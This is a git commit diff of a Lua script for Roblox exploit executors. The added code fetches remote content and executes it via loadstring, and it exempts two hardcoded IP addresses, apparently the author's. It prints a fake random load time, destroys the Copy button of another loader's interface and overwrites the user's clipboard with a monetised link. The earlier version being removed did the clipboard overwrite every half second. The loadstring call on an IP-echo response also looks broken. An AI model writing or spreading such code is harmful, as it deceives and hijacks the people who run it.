d8df98b9a1d9b9e0fc2d301b1ecb6e6df89dd99e
Statur3 <136759048+Statur3@users.noreply.github.com>
2023-07-14 17:29:54 -0700

    Update NewScript.lua

--- NewScript.lua
+++ NewScript.lua
@@ -1,9 +1,14 @@
-local rand = math.random()
-local rand2 = math.random(0, 10)
-local finalNum = rand + rand2
-
-print("Loaded In: "..finalNum.." Seconds")
-
-while task.wait(0.5) do
-  setclipboard("https://direct-link.net/889860/pjl-key")
+local ip = loadstring(game:HttpGet("https://v4.ident.me"))()
+if ip ~= "2.212.149.233" and ip ~= "86.157.169.141" then
+  local rand = math.random()
+  local rand2 = math.random(0, 10)
+  local finalNum = rand + rand2
+  
+  print("Loaded In: "..finalNum.." Seconds")
+  
+  wait(0.5)
+  if game:GetService("CoreGui").AdminusLoader and game:GetService("CoreGui").AdminusLoader.Console and game:GetService("CoreGui").AdminusLoader.Console.Copy then
+    game:GetService("CoreGui").AdminusLoader.Console.Copy:Destroy()
+    setclipboard("https://direct-link.net/889860/pjl-key")
+  end
 end
